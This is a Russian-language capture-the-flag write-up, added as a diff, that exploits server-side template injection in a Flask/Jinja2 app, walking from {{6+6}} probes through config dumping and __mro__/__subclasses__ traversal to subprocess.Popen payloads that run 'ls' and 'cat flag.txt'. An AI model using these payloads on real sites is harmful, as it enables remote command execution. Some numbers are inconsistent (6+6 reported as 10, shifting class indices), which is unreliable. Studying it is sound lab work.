@@ -1,0 +1,248 @@
+
+# task
+
+	host ip: 165.227.231.162:30801 
+
+# discovery
+	
+	nmap -sC -sV -Pn -p 30801 165.227.231.162 -v
+		
+		30801/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.9.0)
+
+# identify vuln
+	
+	### Implementing the SSTI Template
+		
+
+		- Если обратиться к url адресу, можно увидеть строке приветствия
+		указано что сайт работает
+			
+			powered by Flask/Jinja2
+
+		- Jinja2Это имитация по умолчаниюDjangoШаблонный движок для шаблонов 
+		Flask Разработано автором. Поиск по грамматике в Интернете - 2333, 
+		что удобно для просмотра.
+		
+			{{...}}: загрузить переменную. При визуализации шаблона он будет 
+			заменен значением, представленным переданной переменной с тем же 
+			именем.
+ 			
+			{% ...%}: загрузить контрольный оператор.
+ 			
+			{# ... #}: загрузка комментария, среднее значение будет игнорироваться при визуализации шаблона
+	
+
+	### EXPLOTATION Jinja2
+	
+		- Внедряем шаблон
+
+		http://host:port/{{6+6}}
+		
+			GET RESPONSE INCLUDE 
+
+			<str><font style="...">10</font></str> 
+			
+			# шаблон выполнился и в коде ошибки можно увидеть цифру 10
+			которая является результатом суммы 6+4 
+			
+		- Можно сделать вывод что данный сервер уязвим для SSTI 
+			
+			# SSTI это иньекция шаблона на стороне сервера 
+			
+			Мы делаем наше первое интересное открытие, исследуя объект запроса. 
+			Объект запроса представляет собой глобальный шаблон Flask, который 
+			представляет «Текущий объект запроса (flask.request)».
+		
+		- Наше второе интересное открытие связано с самоанализом объекта 
+		конфигурации. Объект конфигурации представляет собой глобальный шаблон 
+		Flask, который представляет «текущий объект конфигурации (flask.config)». 
+		
+			 
+			http://host:port/{{ config.items() }}
+				
+				The page 'dict_items([('ENV', 'production'), ('DEBUG', False), 
+				('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), 
+				('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SECRET_KEY', None), 
+				('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), 
+				('USE_X_SENDFILE', False), ('SERVER_NAME', None), 
+				('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), 
+				('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), 
+				('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', 
+				False), ('SESSION_COOKIE_SAMESITE', None), 
+				('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), 
+				('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(seconds=43200)), 
+				('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), 
+				('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), 
+				('JSON_AS_ASCII', True), ('JSON_SORT_KEYS', True), 
+				('JSONIFY_PRETTYPRINT_REGULAR', False), ('JSONIFY_MIMETYPE', 
+				'application/json'), ('TEMPLATES_AUTO_RELOAD', None), 
+				('MAX_COOKIE_SIZE', 4093)])' could not be found
+
+
+		- Затем вводим config.from_object('os'). Это добавит конфигурации все 
+		атрибуты os, имена переменныъ, которые все в верхнем регмстре. 
+			
+			http://host:port/{{ config.from_object('os')() }}
+				
+				# вернет ошибку, но на самом деле конфигурации изменятся 
+
+		- Снова вводим config.items()
+
+			http://host:port/{{config.items()}}
+				
+				NEW ELEMENTS AFTER REQUEST
+				
+				('CLD_CONTINUED', 6), ('CLD_DUMPED', 3), ('CLD_EXITED', 1), 
+				('CLD_KILLED', 2), ('CLD_STOPPED', 5), ('CLD_TRAPPED', 4), 
+				('EX_CANTCREAT', 73), (' EX_CONFIG', 78), ('EX_DATAERR', 65), 
+				('EX_IOERR', 74), ('EX_NOHOST', 68), ('EX_NOINPUT', 66), 
+				('EX_NOPERM', 77), ('EX_NOUSER' , 67), ('EX_OK', 0), 
+				('EX_OSERR', 71), ('EX_OSFILE', 72), ('EX_PROTOCOL', 76), 
+				('EX_SOFTWARE', 70), ('EX_TEMPFAIL', 75 ), ('EX_UNAVAILABLE', 69), 
+				('EX_USAGE', 64), ('F_LOCK', 1), ('F_OK', 0), ('F_TEST', 3), 
+				('F_TLOCK', 2), ('F_ULOCK', 0), ('GRND_NONBLOCK', 1), 
+				('GRND_RANDOM', 2), ('MFD_ALLOW_SEALING', 2), ('MFD_CLOEXEC', 1), 
+				('MFD_HUGETLB', 4), (' MFD_HUGE_16GB', -2013265920), 
+				('MFD_HUGE_16MB', 1610612736), ('MFD_HUGE_1GB', 2013265920), 
+				('MFD_HUGE_1MB', 1342177280), ('MFD_HUGE_256MB', 1879048192), 
+				('MFD_HUGE_2GB', 2080374784), ('MFD_HUGE_2MB ', 1409286144), 
+				('MFD_HUGE_32MB', 1677721600), ('MFD_HUGE_512KB', 1275068416), 
+				('MFD_HUGE_512MB', 1946157056), ('MFD_HUGE_64KB', 1073741824), 
+				('MFD_HUGE_8MB', 1543503872), ('MFD_HUGE_MASK', 63), 
+				('MFD_HUGE_SHI FT', 26), ('NGROUPS_MAX', 65536), ('O_ACCMODE', 3), 
+				('O_APPEND', 1024), ('O_ASYNC', 8192), ('O_CLOEXEC', 524288), 
+				('O_CREAT' , 64), ('O_DIRECT', 16384), ('O_DIRECTORY', 65536), 
+				('O_DSYNC', 4096), ('O_EXCL', 128), ('O_LARGEFILE', 0), 
+				('O_NDELAY', 2048 ), ('O_NOATIME', 262144), ('O_NOCTTY', 256), 
+				('O_NOFOLLOW', 131072), ('O_NONBLOCK', 2048), ('O_PATH', 2097152), 
+				('O_RDONLY', 0), ('O_RDWR', 2), ('O_RSYNC', 1052672), 
+				('O_SYNC', 1052672), ('O_TMPFILE', 4259840), ('O_TRUNC', 512), 
+				('O_WRONLY', 1), (' POSIX_FADV_DONTNEED', 4), ('POSIX_FADV_NOREUSE', 5), 
+				('POSIX_FADV_NORMAL', 0), ('POSIX_FADV_RANDOM', 1), 
+				('POSIX_FADV_SEQUENTIAL', 2), ('POSIX_FADV_WILLNEED', 3), 
+				('POSIX_SPAWN_CLOSE' , 1), ('POSIX_SPAWN_DUP2', 2), 
+				('POSIX_SPAWN_OPEN', 0), ('PRIO_PGRP', 1), ('PRIO_PROCESS', 0), 
+				('PRIO_USER', 2), ('P_ALL', 0 ), ('P_NOWAIT', 1), ('P_NOWAITO', 1), 
+				('P_PGID', 2), ('P_PID', 1), ('P_WAIT', 0), ('RTLD_DEEPBIND', 8), 
+				('RTLD_GLOBAL', 256), ('RTLD_LAZY', 1), ('RTLD_LOCAL', 0), 
+				('RTLD_NODELETE', 4096), ('RTLD_N OLOAD', 4), ('RTLD_NOW', 2), 
+				('RWF_DSYNC', 2), ('RWF_HIPRI', 1), ('RWF_NOWAIT', 8), 
+				('RWF_SYNC', 4), ('R_OK' , 4), ('SCHED_BATCH', 3), ('SCHED_FIFO', 1), 
+				('SCHED_IDLE', 5), ('SCHED_OTHER', 0), ('SCHED_RESET_ON_FORK', 
+				1073741824), ('SCHED_RR', 2 ), ('SEEK_CUR', 1), ('SEEK_DATA', 3), 
+				('SEEK_END', 2), ('SEEK_HOLE', 4), ('SEEK_SET', 0), ('ST_APPEND', 256), 
+				('ST_MANDLOCK', 64), ('ST_NOATIME', 1024), ('ST_NODEV', 4), 
+				('ST_NODIRATIME', 2048), ('ST_NOEXEC', 8), ('ST_NOSUID', 2), 
+				(' ST_RDONLY', 1), ('ST_RELATIME', 4096), ('ST_SYNCHRONOUS', 16), 
+				('ST_WRITE', 128), ('TMP_MAX', 238328), ('WCONTINUED', 8), 
+				('WCOREDUMP' , <встроенная функция WCOREDUMP>), ('WEXITED', 4), 
+				('WEXITSTATUS', <встроенная функция WEXITSTATUS>), 
+				('WIFCONTINUED', <встроенная функция WIFCONTINUED>), 
+				('WIFEXITED' , <встроенная функция WIFEXITED>), ('WIFSIGNALED', 
+				<встроенная функция WIFSIGNALED>), ('WIFSTOPPED', 
+				<встроенная функция WIFSSTOPED>), ('WNOHANG', 1), ('WNOWAIT' , 
+				16777216), ('WSTOPPED', 2), ('WSTOPSIG', <встроенная функция 
+				WSTOPS IG>), ('WTERMSIG', <встроенная функция WTERMSIG>), 
+				('WUNTRACED', 2), ('W_OK', 2), ('XATTR_CREATE', 1), 
+				('XATTR_REPLACE', 2), ('XATTR_SIZE_MAX', 65536), ('X_OK', 1)]) 
+				' невозможно найти
+
+		- Любые вызываемые элементы, добавленные в объект конфигурации, теперь 
+		можно вызывать через уязвимость SSTI. Следующим шагом является поиск 
+		функциональности в доступных импортируемых модулях, которыми можно 
+		манипулировать, чтобы выйти из изолированной программной среды шаблона. 
+
+			__class__
+				
+				# узнать к какому классу принадлежит объект
+
+			__mro__ 
+
+				# вернуться вверх по дереву унаследованных
+				объектов в текущей среде python 
+
+			__subclasses__ 
+				
+				# спуститься вниз и вывести все подклассы
+
+		- Начав с объекта нового типа, например типа str , мы можем проползти 
+		вверх по дереву наследования до корневого класса объектов, используя 
+		__mro__ , а затем проползти вниз до каждого объекта нового стиля в среде 
+		Python, используя __subclasses__ . Да, это дает нам доступ ко всем классам,
+		загруженным в текущей среде Python. Итак, как мы можем использовать эту 
+		новообретенную возможность? 
+
+			http://host:port/{{''.__class__.__mro__}}
+				
+				ERROR 404
+				The page '(<class 'str'>, <class 'object'>)' could not be found
+
+		- Мы видим, как нам возвращается ранее обсуждавшийся кортеж. Поскольку 
+		мы хотим вернуться к корневому объектов , мы будем использовать индекс 
+		1 для выбора типа класса object . Теперь, когда мы находимся в корневом 
+		объекте, мы можем использовать __subclasses__ для вывода всех классов, 
+		используемых в приложении. 
+		Внедрите {{ ''.__class__.__mro__[1].__subclasses__() }} в уязвимость SSTI.
+			
+			http://host:port/{{''.__class__.__mro__[1].__subclasses__()}}
+
+				ERROR 404
+					
+				Вывод содержит информацию о множестве низлежащих классов, 
+				вот часть вывода
+					
+					The page '[<class 'type'>, <class 'weakref'>, 
+					<class 'weakcallableproxy'>, <class 'weakproxy'>, 
+					<class 'int'>, <class 'bytearray'>, <class 'bytes'>, 
+					<class 'list'>, <class 'NoneType'>, 
+					<class 'NotImplementedType'>, <class 'traceback'>, 
+					<class 'super'>, <class 'range'>, <class 'dict'>, 
+					<class 'dict_keys'>, <class 'dict_values'>, 
+					<class 'dict_items'>, <class 'dict_reversekeyiterator'>, 
+					<class 'dict_reversevalueiterator'>, 
+					<class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, 
+					<class 'set'>, <class 'str'>, <class 'slice'>, 
+					<class 'staticmethod'>, <class 'complex'>, 
+					<class 'float'>, <class 'frozenset'>, <class 'property'>, 
+					<class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, 
+					<class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, 
+					<class 'code'>, <class 'frame'>, 
+					<class 'builtin_function_or_method'>, <class 'method'>, 
+					<class 'function'>, ...etc
+				
+				нажав CTRL + F на странице можно найти возможный подкласс
+				для внедрения вредоносного кода
+					
+					[SEARCH] : subprocess
+						
+						<class 'subprocess.Popen'> 
+
+
+		- К счастью, у нас есть класс subprocess.Popen , и для поиска, где 
+		находится конкретный индекс subprocess.Popen, мы можем использовать 
+		нарезку в python. Снова введите и найдите индекс 
+		subprocess.Popen {{''.__class__.__mro__[1].__subclasses__()[284:]} } .
+			
+			http://ip:port/{{''.__class__.__mro__[1].__subclasses__()[410:]}}
+
+			ERROR 404 
+
+			The page '[<class 'werkzeug.test._TestCookieResponse'>, 
+			<class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, 
+			<class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>,
+
+		- Наконец мы нашли именно инъекцию {{''.__class__.__mro__[1].__subclasses__()[414]}},
+		где 287 — это индекс класса * <class 'subprocess.Popen'> в моей среде. 
+		Теперь мы можем использовать подпроцесс, добавив какой-нибудь вредоносный код. 
+
+			
+			http://ip:port/{{''.__class__.__mro__[1].__subclasses__()[414]('ls', shell=True, stdout=-1).communicate()}}
+				
+				The page '(b'bin\nboot\ndev\netc\nflag.txt\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n', None)' 
+				could not be found
+
+		- Можно увидеть список файлов среди которых есть flag.txt
+
+			http://ip:port/{{''.__class__.__mro__[1].__subclasses__()[414]('cat flag.txt', shell=True, stdout=-1).communicate()}}
+
+				The page '(b'HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}\n', None)' could not be found
